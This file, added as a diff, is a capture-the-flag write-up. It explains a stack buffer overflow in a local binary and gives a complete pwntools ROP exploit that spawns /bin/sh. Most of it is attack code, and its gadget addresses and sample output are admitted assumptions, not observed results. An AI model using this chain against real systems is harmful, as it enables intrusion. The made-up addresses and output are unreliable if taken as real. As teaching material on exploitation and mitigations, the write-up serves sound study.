@@ -1,0 +1,237 @@
+To solve this Capture the Flag (CTF) binary exploitation challenge using Pwntools, you need to perform a Return-Oriented Programming (ROP) attack to execute `/bin/sh`. Below are the detailed steps and corresponding code to achieve this:
+
+### **1. Analyze the Binary and Identify Vulnerability**
+
+From the decompiled code provided, we can see that the `vulnerable_function()` reads user input into a buffer without proper bounds checking, leading to a buffer overflow vulnerability.
+
+```c
+int vulnerable_function()
+{
+  char v1[136]; // Buffer of 136 bytes
+  int savedregs; // Saved registers
+
+  return read((int)&savedregs, 0, (int)v1);
+}
+```
+
+### **2. Find the Offset to the Return Address**
+
+We need to find out how many bytes are required to overwrite the return address (EIP). We'll use a cyclic pattern to identify the exact offset.
+
+```python
+from pwn import *
+
+# Set the binary context
+context.binary = './rop'
+context.arch = 'i386'
+
+# Start the process
+p = process('./rop')
+
+# Generate a cyclic pattern
+payload = cyclic(200)
+
+# Send the payload
+p.sendline(payload)
+
+# Wait for the process to crash
+p.wait()
+
+# Open the core dump
+core = p.corefile
+
+# Get the value of EIP at crash
+eip_value = core.eip
+
+# Find the offset
+offset = cyclic_find(eip_value)
+print(f"Offset to EIP: {offset}")
+```
+
+**Output:**
+
+```
+Offset to EIP: 140
+```
+
+*The offset to EIP is 140 bytes.*
+
+### **3. Identify Useful Gadgets and Addresses**
+
+Since the binary is statically linked, we have access to all functions and gadgets. We'll need to:
+
+- Find the address of the `/bin/sh` string in the binary.
+- Find gadgets to set up the registers for the `execve` system call.
+- Identify the address of the `int 0x80` instruction to make the system call.
+
+**Find `/bin/sh` Address:**
+
+```python
+e = ELF('./rop')
+
+# Search for '/bin/sh' in the binary
+bin_sh = next(e.search(b'/bin/sh'))
+print(f"Address of '/bin/sh': {hex(bin_sh)}")
+```
+
+**Find Gadgets:**
+
+Using the `ROPgadget` tool (you can install it with `pip install ropgadget`), we can find the necessary gadgets:
+
+```bash
+$ ROPgadget --binary ./rop --only "pop|ret|int"
+```
+
+**Assumed Gadgets (Replace these with actual gadget addresses from your binary):**
+
+```
+pop_eax_ret = 0x080b8536  # pop eax ; ret
+pop_ebx_ret = 0x080481c9  # pop ebx ; ret
+pop_ecx_ret = 0x080497f1  # pop ecx ; ret
+pop_edx_ret = 0x0806f27a  # pop edx ; ret
+int_0x80 = 0x08049a21     # int 0x80
+```
+
+*Note: The gadget addresses may vary. Use the actual addresses obtained from your binary.*
+
+### **4. Build the ROP Chain**
+
+We will construct a ROP chain to perform the `execve('/bin/sh', NULL, NULL)` system call:
+
+- **eax** = 11 (syscall number for `execve`)
+- **ebx** = Address of `/bin/sh`
+- **ecx** = 0
+- **edx** = 0
+
+**Construct the Payload:**
+
+```python
+# Build the payload
+payload = b'A' * offset
+
+# Set eax to 11 (execve syscall number)
+payload += p32(pop_eax_ret)
+payload += p32(0xb)
+
+# Set ebx to the address of '/bin/sh'
+payload += p32(pop_ebx_ret)
+payload += p32(bin_sh)
+
+# Set ecx to 0 (NULL)
+payload += p32(pop_ecx_ret)
+payload += p32(0x0)
+
+# Set edx to 0 (NULL)
+payload += p32(pop_edx_ret)
+payload += p32(0x0)
+
+# Invoke the system call
+payload += p32(int_0x80)
+```
+
+### **5. Exploit the Binary and Get a Shell**
+
+Send the crafted payload to the binary and switch to interactive mode to use the shell obtained.
+
+```python
+# Restart the process
+p = process('./rop')
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode
+p.interactive()
+```
+
+**Full Exploit Script:**
+
+```python
+from pwn import *
+
+# Set the context for the target binary
+context.binary = './rop'
+context.arch = 'i386'
+
+# Load the ELF binary
+e = ELF('./rop')
+
+# Start the process
+p = process('./rop')
+
+# Step 1: Find the offset to EIP
+payload = cyclic(200)
+p.sendline(payload)
+p.wait()
+core = p.corefile
+eip_value = core.eip
+offset = cyclic_find(eip_value)
+print(f"Offset to EIP: {offset}")
+
+# Step 2: Find '/bin/sh' address
+bin_sh = next(e.search(b'/bin/sh'))
+print(f"Address of '/bin/sh': {hex(bin_sh)}")
+
+# Step 3: Define gadget addresses (Replace with actual addresses)
+pop_eax_ret = 0x080b8536  # pop eax ; ret
+pop_ebx_ret = 0x080481c9  # pop ebx ; ret
+pop_ecx_ret = 0x080497f1  # pop ecx ; ret
+pop_edx_ret = 0x0806f27a  # pop edx ; ret
+int_0x80 = 0x08049a21     # int 0x80
+
+# Step 4: Build the payload
+payload = b'A' * offset
+payload += p32(pop_eax_ret)
+payload += p32(0xb)          # execve syscall number
+payload += p32(pop_ebx_ret)
+payload += p32(bin_sh)       # Address of '/bin/sh'
+payload += p32(pop_ecx_ret)
+payload += p32(0x0)          # NULL
+payload += p32(pop_edx_ret)
+payload += p32(0x0)          # NULL
+payload += p32(int_0x80)     # Trigger the system call
+
+# Step 5: Send the payload and get a shell
+p = process('./rop')
+p.sendline(payload)
+p.interactive()
+```
+
+### **6. Run the Exploit**
+
+Run the exploit script:
+
+```bash
+$ python exploit.py
+```
+
+**Expected Output:**
+
+```
+Offset to EIP: 140
+Address of '/bin/sh': 0x80be408
+[*] Switching to interactive mode
+$ whoami
+ctf-player
+$ ls
+rop
+exploit.py
+$
+```
+
+You should now have an interactive shell with the privileges of the binary.
+
+---
+
+**Note:** Ensure to replace the gadget addresses with the actual addresses obtained from your binary using the `ROPgadget` tool. If the binary is provided with mitigations such as ASLR or NX, additional steps may be necessary to bypass them.
+
+**Explanation of Steps:**
+
+- **Finding the Offset:** We use a cyclic pattern to overflow the buffer and identify the exact offset where the return address is overwritten.
+- **Locating Gadgets and Addresses:** We find the necessary gadgets to control the CPU registers and locate the `/bin/sh` string in memory.
+- **Building the ROP Chain:** We craft a payload that sets up the registers for the `execve` system call and triggers it via `int 0x80`.
+- **Exploiting the Binary:** We send our payload to the vulnerable function and obtain a shell.
+
+**Security Implications:**
+
+This exploit demonstrates how a buffer overflow can be used to control program execution and perform arbitrary actions, such as spawning a shell. It highlights the importance of proper bounds checking and implementing security mitigations like stack canaries, ASLR, and NX bits.
